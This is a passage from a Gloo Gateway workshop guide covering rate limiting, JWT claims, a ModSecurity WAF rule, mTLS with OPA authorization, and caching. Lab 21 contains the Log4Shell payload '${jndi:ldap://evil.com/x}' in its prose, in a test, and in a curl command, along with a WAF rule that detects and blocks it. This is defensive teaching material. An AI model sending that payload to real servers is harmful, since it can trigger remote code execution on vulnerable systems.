echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
-->
If you open the browser in incognito and login using the username `user2` and the password `password`, you will now be able to access it since the user's email ends with `@solo.io`.




## Lab 18 - Use the transformation filter to manipulate headers <a name="lab-18---use-the-transformation-filter-to-manipulate-headers-"></a>


In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:

Let's update the `RouteOption` to extract the domain name from the email of the user.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
EOF
```

If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Transformation is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'X-Organization' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 18"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
-->



## Lab 19 - Apply rate limiting to the Gateway <a name="lab-19---apply-rate-limiting-to-the-gateway-"></a>

In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.

First, we need to create a `RateLimitConfig` object to define the limits:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-users
  namespace: httpbin
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: organization
            value: solo.io
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
    rateLimits:
    - setActions:
      - requestHeaders:
          descriptorKey: organization
          headerName: X-Organization
EOF
```

Finally, you need to update the `RouteOption` to use this `RateLimitConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
    rateLimitConfigs:
      refs:
      - name: limit-users
        namespace: httpbin
EOF
```

Refresh the web page multiple times.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Rate limiting is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
-->

You should get a `200` response code the first 3 times and a `429` response code after.

Let's apply the original `HTTPRoute` yaml:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Let's delete the `RouteOption` object:
```bash
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
```



## Lab 20 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-20---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>


In this step, we're going to validate the JWT token and to create a new header from the `email` claim.

You can restrict a request's access based on the claims and scopes in a JWT. `Claims` are key-value pairs that provide identity details, such as the subject's user ID, the entity that issued the token, and expiration time. `Scopes` are strings that indicate the permissions granted to the token holder.

We need to create an `Upstream` representing Keycloak:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: keycloak
  namespace: gloo-system
spec:
  static:
    hosts:
      - addr: ${HOST_KEYCLOAK}
        port: ${PORT_KEYCLOAK}
EOF
```


Then, we need to create a `RouteOption` to validate the JWT token and extract the `email` claim.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
EOF
```

This is targeting the httpbin `HTTPRoute`.


Try accessing the `httpbin` application without any token.

```bash,noexecute
curl -k https://httpbin.example.com/get
```

You should get a `Jwt is missing` error message.

Let's get a JWT token:

```bash
export USER1_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
```

Now, you should be able to access it:

```bash,noexecute
curl -k https://httpbin.example.com/get -H "jwt: ${USER1_COOKIE_JWT}"
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Email": [
      "user1@example.com"
    ],
    "X-Envoy-Expected-Rq-Timeout-Ms": [
      "15000"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "3eda8433-741d-40fd-887e-b6dddca89a3d"
    ]
  },
  "method": "GET",
  "origin": "10.101.0.18:60788",
  "url": "https://httpbin.example.com/get"
}
```

You should see a new `X-Email` header added to the request with the value `user1@example.com`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const jwtString = process.env.USER1_COOKIE_JWT;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"X-Email":' }));
  it('The new header has value', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"user1@example.com"' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
-->


We can also update the `RouteOption` to add a RBAC rule to only allow a user with the email `user2@solo.io` to access the application.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
    rbac:
      policies:
        viewer:
          principals:
          - jwtPrincipal:
              claims:
                email: user2@solo.io
EOF
```


Try accessing the `httpbin` application again.

```bash,noexecute
curl -k https://httpbin.example.com/get -H "jwt: ${USER1_COOKIE_JWT}"
```

You should get a `RBAC: access denied` error message.

Let's get a JWT token for the second user.

We will use gloo to add conditional access to the `httpbin` service based on the `email` scope and claim in the JWT token.

```bash
export USER2_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user2" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
```

You should be able to access the application with this user.

```bash,noexecute
curl -k https://httpbin.example.com/get -H "jwt: ${USER2_COOKIE_JWT}"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Only User2 can access httpbin", function() {
  const jwt1String = process.env.USER1_COOKIE_JWT;
  it('User1 access is refused', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt1String }], body: 'RBAC: access denied' }));
  const jwt2String = process.env.USER2_COOKIE_JWT;
  it('User2 access is allowed', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt2String }], body: '"user2@solo.io"' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
-->


Let's delete the `VirtualHostOption` we've created:

```bash

kubectl --context ${CLUSTER1} -n httpbin delete routeoption routeoption

```




## Lab 21 - Use the Web Application Firewall filter <a name="lab-21---use-the-web-application-firewall-filter-"></a>

A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.

Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.

An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.

The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.

Using the Web Application Firewall capabilities you can reject requests containing such headers.

Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.

You need to create the following `RouteOption`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: waf
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    waf:
      customInterventionMessage: 'Log4Shell malicious payload'
      ruleSets:
      - ruleStr: |
          SecRuleEngine On
          SecRequestBodyAccess On
          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
```

As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
var chai = require('chai');
var expect = chai.expect;

describe("WAF is working properly", function() {
  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
-->

Run the following command to simulate an attack:

```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
```

The request should be rejected:

```http,nocopy
HTTP/2 403 
content-length: 27
content-type: text/plain
date: Tue, 05 Apr 2022 10:20:06 GMT
server: istio-envoy

Log4Shell malicious payload
```

Let's delete the `RouteOption` we've created:

```bash
kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
```




## Lab 22 - Validate and authorize client certificates <a name="lab-22---validate-and-authorize-client-certificates-"></a>

In this step, we're going to secure the access to the httpbin service using mutual TLS (mTLS), and apply further authorization based on information in the client certificate.

First, we need to make sure we have certificates for both the server (which is our `Gateway` in this case) and the client.
We already have the serving certificate that we created when exposing the httpbin application using HTTPS, so next we need to create the certificate that our clients will use to access the httpbin application.

Create a new certificate authority (CA) that will sign keys for our clients and be trusted by the gateway:

```bash
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -keyout client-ca.key \
  -out client-ca.crt \
  -sha512 \
  -subj "/CN=clientca"
```

We need the gateway to trust this CA, so we'll add it to the existing `tls-secret` that is used for TLS termination:

```bash
kubectl -n gloo-system create secret generic tls-secret \
  --type=kubernetes.io/tls \
  --from-file=tls.crt \
  --from-file=tls.key \
  --from-file=ca.crt=client-ca.crt \
  --dry-run=client -o yaml \
  | kubectl --context ${CLUSTER1} apply -f -
```

The gateway is already configured to use this secret in its TLS configuration, so this will now cause the gateway to require and validate client certificates on all requests.

Create and sign a certificate for a client that is authorized to access the httpbin service:

```bash
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -CA client-ca.crt \
  -CAkey client-ca.key \
  -keyout authorized-client.key \
  -out authorized-client.crt \
  -sha512 \
  -subj "/C=US/ST=Massachusetts/L=Boston/O=Solo-io/OU=pki/CN=authorized-client" \
  -addext "basicConstraints = CA:false" \
  -addext "extendedKeyUsage = clientAuth"
```

Now we can test that the httpbin service is only accessible when the client provides its own valid certificate.

Try to access httpbin without providing a client certificate:

```bash,noexecute
curl -k https://httpbin.example.com/get
```

You should get an SSL error similar to this:

```,nocopy
curl: (56) OpenSSL SSL_read: OpenSSL/3.0.13: error:0A00045C:SSL routines::tlsv13 alert certificate required, errno 0
```

Now try to access the service using the client certificate that we generated and signed with the client CA:

```bash,noexecute
curl -k https://httpbin.example.com/get --cert authorized-client.crt --key authorized-client.key
```

You should get the usual response from the httpbin application:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "da97c85e-b500-4f2a-81e7-bb4cda2605a7"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:52655",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const chai = require("chai");
const helpersHttp = require('./tests/chai-http');
const https = require("https");

describe("Downstream mTLS", () => {
  it("rejects requests without client certificate", (done) => {
    const options = {
      hostname: `httpbin.example.com`,
      port: 443,
      path: '/get',
      method: 'GET',
      rejectUnauthorized: false,
      agent: false, // Disable the agent to avoid keeping sockets open for reuse, which leads to the test not exiting in some cases
    };

    const req = https.request(options, (res) => {
      done(new Error('Request should fail'));
    });

    req.on('error', (err) => {
      chai.expect(err.message).to.include('tlsv13 alert certificate required');
      done();
    });

    req.end();
  });

  it("allows requests with valid client certificate", async () => await helpersHttp.checkURL({
      host: `https://httpbin.example.com`,
      path: '/get',
      certFile: 'authorized-client.crt',
      keyFile: 'authorized-client.key',
      retCode: 200
    }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 22"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
-->

We've now enforced mutual TLS at the gateway, such that all clients accessing the httpbin service must present a valid certificate signed by the client CA trusted by the gateway.

Next, let's perform an authorization step on these requests so that we can control which clients (as given in their certificate's Common Name, or `CN`) can access the httpbin application.

To do this, we need to make sure the gateway forwards details of the client certificate's Subject to the upstream httpbin service. We do this by creating an `HttpListenerOption` that provides additional configuration to the gateway:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: HttpListenerOption
metadata:
  name: forward-client-cert
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
    sectionName: https-httpbin
  options:
    httpConnectionManagerSettings:
      forwardClientCertDetails: APPEND_FORWARD
      setCurrentClientCertDetails:
        subject: true
EOF
```

Access the httpbin application again, and look for a new `X-Forwarded-Client-Cert` header in the response:

```bash,noexecute
curl -k https://httpbin.example.com/get --cert authorized-client.crt --key authorized-client.key
```

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "8e61c480-6373-4c38-824b-2bfe89e79d0c"
    ],
    "X-Forwarded-Client-Cert": [
      "Hash=672e1b132aed6505db21717c3510f1dd5d3149c0070f4ae5a562cef95444f543;Subject=\"CN=authorized-client,OU=pki,O=Solo-io,L=Boston,ST=Massachusetts,C=US\""
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:52655",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Client certificate forwarding", () => {
  it('adds \'X-Forwarded-Client-Cert\' header', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', certFile: 'authorized-client.crt', keyFile: 'authorized-client.key', body: 'X-Forwarded-Client-Cert', match: true }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 22"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
-->

With the `Subject` of the client certificate now available in the `X-Forwarded-Client-Cert` header, the team in charge of the httpbin application can use an OPA rule to check that the Common Name (`CN`) in the `Subject` is in a list of permitted clients:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: client-cert-cn
  namespace: httpbin
spec:
  configs:
    - opaAuth:
        modules:
        - name: allow-authorized-clients-by-common-name
          namespace: httpbin
        query: "data.test.allow == true"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-authorized-clients-by-common-name
  namespace: httpbin
data:
  policy.rego: |-
    package test

    import future.keywords.if
    import future.keywords.in

    default allow := false

    allow if cn(input.http_request.headers["x-forwarded-client-cert"]) in ["authorized-client"]

    cn(client_cert) := cn if {
        # Split the client cert by semicolon and find the Subject
        cert_parts := split(client_cert, ";")
        some subject_string in cert_parts
        startswith(subject_string, "Subject=")
        subject := trim(trim_left(subject_string, "Subject="), "\\\\\"")

        # Extract the CN from the Subject field
        subject_parts := split(subject, ",")
        some cn_string in subject_parts
        startswith(cn_string, "CN=")
        cn := trim_left(cn_string, "CN=")
    }

EOF
```

Reference this `AuthConfig` in a `RouteOption` resource that can be associated with the httpbin route:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: client-cert-cn
        namespace: httpbin
EOF
```

Finally, apply this `RouteOption` to the httpbin route:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Let's test this using the client we worked with above, who is authorised to the httpbin service based on its Common Name:

```bash,noexecute
curl -k https://httpbin.example.com/get --cert authorized-client.crt --key authorized-client.key
```

You should get the usual valid response back from httpbin. This client is permitted to access the service based on its subject including `CN=authorized-client` and the OPA rule we created above permitting this Common Name.

Now, let's make sure that a new client that is not authorized to use the httpbin service _cannot_ access it.

Create a new certificate signed by the same CA for a client that is _not_ authorized to access the httpbin service:

```bash
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -CA client-ca.crt \
  -CAkey client-ca.key \
  -keyout unauthorized-client.key \
  -out unauthorized-client.crt \
  -sha512 \
  -subj "/C=US/ST=Massachusetts/L=Boston/O=Solo-io/OU=pki/CN=unauthorized-client" \
  -addext "basicConstraints = CA:false" \
  -addext "extendedKeyUsage = clientAuth"
```

Note that we created this with a subject containing `CN=unauthorized-client`:

```bash,noexecute
openssl x509 -in unauthorized-client.crt -noout -subject
```

Try to access the httpbin service with this client certificate:

```bash,noexecute
curl -Ik https://httpbin.example.com/get --cert unauthorized-client.crt --key unauthorized-client.key
```

You should be denied:

```http,nocopy
HTTP/2 403
content-length: 8
content-type: text/plain
date: Thu, 29 Aug 2024 16:58:39 GMT
server: envoy
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authorization based on Common Name", () => {
    it("allows requests to httpbin with authorized client certificate", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', certFile: 'authorized-client.crt', keyFile: 'authorized-client.key', retCode: 200 }));
    it("denies requests to httpbin with unauthorized client certificate", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', certFile: 'unauthorized-client.crt', keyFile: 'unauthorized-client.key', retCode: 403 }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 22"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
-->

Now, the team in charge of the gateway has enforced mutual authentication that validates that client certificates were signed by a trusted CA, and the httpbin team has extended it with an authorization policy using OPA that checks the client certificate's Common Name and allows requests only if the Common Name is in a preconfigured list of clients.

Set the secret containing the serving certificate back to its original content:

```bash
kubectl -n gloo-system create secret tls tls-secret \
  --key tls.key \
  --cert tls.crt \
  --dry-run=client -o yaml \
  | kubectl --context ${CLUSTER1} apply -f -
```

Reset the `HTTPRoute` back to its original state:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

And finally delete the resources we created to configure authorization:

```bash
kubectl --context ${CLUSTER1} -n gloo-system delete HttpListenerOption forward-client-cert
kubectl --context ${CLUSTER1} -n httpbin delete AuthConfig client-cert-cn
kubectl --context ${CLUSTER1} -n httpbin delete ConfigMap allow-authorized-clients-by-common-name
kubectl --context ${CLUSTER1} -n httpbin delete RouteOption routeoption
```



## Lab 23 - Use the `cache-control` response header to cache responses <a name="lab-23---use-the-`cache-control`-response-header-to-cache-responses-"></a>

An HTTP or HTTPS listener on your gateway can be configured to cache responses for upstream services.
When the listener routes a request to an upstream service, the response from the upstream is automatically cached by the caching server if it contains a `cache-control` response header.
All subsequent requests receive the cached response until the cache entry expires.

Check that we have a caching service running in the Gloo Gateway installation:

```bash,noexecute
kubectl --context ${CLUSTER1} -n gloo-system get deploy caching-service
```

You should see a healthy deployment of the caching service:

```,nocopy
NAME              READY   UP-TO-DATE   AVAILABLE   AGE
caching-service   1/1     1            1           166m
```

This service is responsible for creating the cached responses in the backing Redis datastore when an eligible response is being processed.

The **httpbin** application has some utility endpoints we can use to test that caching is applied.
First of all, let's make sure that caching is *not* being applied by making a request to the `/cache` endpoint, passing a cache time-to-live (TTL) value of 10 seconds that we want the service to use in the response `cache-control` header:

```bash,noexecute
curl -ksSD - -o /dev/null https://httpbin.example.com/cache/10
```

We'll get a response like this back, which includes the `cache-control` header set by the application with a value `max-age=10`:

```http,nocopy
HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
cache-control: public, max-age=10
content-type: application/json; charset=utf-8
date: Mon, 29 Jul 2024 14:10:48 GMT
content-length: 513
x-envoy-upstream-service-time: 0
server: envoy
```

Send a second request within that cache TTL of 10 seconds and look at the response:

```bash,noexecute
curl -ksSD - -o /dev/null https://httpbin.example.com/cache/10
```

```http,nocopy
HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
cache-control: public, max-age=10
content-type: application/json; charset=utf-8
date: Mon, 29 Jul 2024 14:10:53 GMT
content-length: 513
x-envoy-upstream-service-time: 0
server: envoy
```

See that the timestamp in the `date` headers of the two responses are different, meaning that we got a fresh response back from the **httpbin** application each time.

<!--bash
cat <<'EOF' > ./test.js
const chaiHttp = require("chai-http");
const chai = require("chai");
const crypto = require("crypto")
const expect = chai.expect;

chai.use(chaiHttp);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const httpbin = `https://httpbin.example.com`;
const cachepath = '/cache/1';
var path_key;

describe("response caching", function() {

  // Make the first request whose response would be cached if enabled
  beforeEach(function(done) {
    path_key = crypto.randomUUID();
    chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
      if (err) return done(err);
      done();
    });
  });

  it('returns a fresh response within cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.not.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 100);
  });

})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
-->

In this example we'll configure caching on all routes processed by the `Gateway` that we have already set up.
We do this by defining a `HttpListenerOption` resource that includes a reference to the caching server:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: HttpListenerOption
metadata:
  name: cache
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
  options:
    caching:
      cachingServiceRef:
        name: caching-service
        namespace: gloo-system
EOF
```

Note that this refers to the `Gateway` resource as a whole, so it will apply to all listeners on that gateway.
We can also restrict it to a particular listener by including a value for `sectionName` corresponding to the `name` of a given listener.

Let's test this configuration by making three requests to the `/cache` endpoint with a 10s cache TTL value, waiting 6 seconds between requests:

```bash,noexecute
curl -ksSD - -o /dev/null https://httpbin.example.com/cache/10
sleep 6
curl -ksSD - -o /dev/null https://httpbin.example.com/cache/10
sleep 6
curl -ksSD - -o /dev/null https://httpbin.example.com/cache/10
```

Check the responses:

```http,nocopy
HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
cache-control: public, max-age=10
content-type: application/json; charset=utf-8
date: Mon, 29 Jul 2024 14:25:05 GMT
content-length: 513
x-envoy-upstream-service-time: 0
server: envoy

HTTP/2 200
access-control-allow-credentials: true
cache-control: public, max-age=10
x-envoy-upstream-service-time: 0
access-control-allow-origin: *
date: Mon, 29 Jul 2024 14:25:05 GMT
content-type: application/json; charset=utf-8
content-length: 513
age: 6
server: envoy

HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
cache-control: public, max-age=10
content-type: application/json; charset=utf-8
date: Mon, 29 Jul 2024 14:25:17 GMT
content-length: 513
x-envoy-upstream-service-time: 0
server: envoy
```

<!--bash
cat <<'EOF' > ./test.js
const chaiHttp = require("chai-http");
const chai = require("chai");
const crypto = require("crypto")
const expect = chai.expect;

chai.use(chaiHttp);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const httpbin = `https://httpbin.example.com`;
